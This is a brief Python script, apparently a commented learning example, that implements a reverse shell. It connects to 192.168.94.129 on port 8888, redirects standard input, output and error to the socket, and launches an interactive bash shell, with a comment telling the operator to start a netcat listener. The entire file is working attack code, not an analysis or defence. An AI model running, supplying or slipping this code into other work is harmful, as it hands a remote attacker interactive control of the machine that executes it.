#!/usr/bin/python

from os import dup2
from subprocess import run
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creating our Socket Object / AF_NET is IPv4, SOCK_STREAM is TCP

# nc -lnvp 8888  -> your listener

s.connect(('192.168.94.129', 8888))  # Connecting to the remote host, the ip you should be listening on!


dup2(s.fileno(), 0)  # fileno returns the socket file descriptor
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)  # takes two file descriptors as arguments, makes second descriptor point to the open file

run(["/bin/bash", "-i"])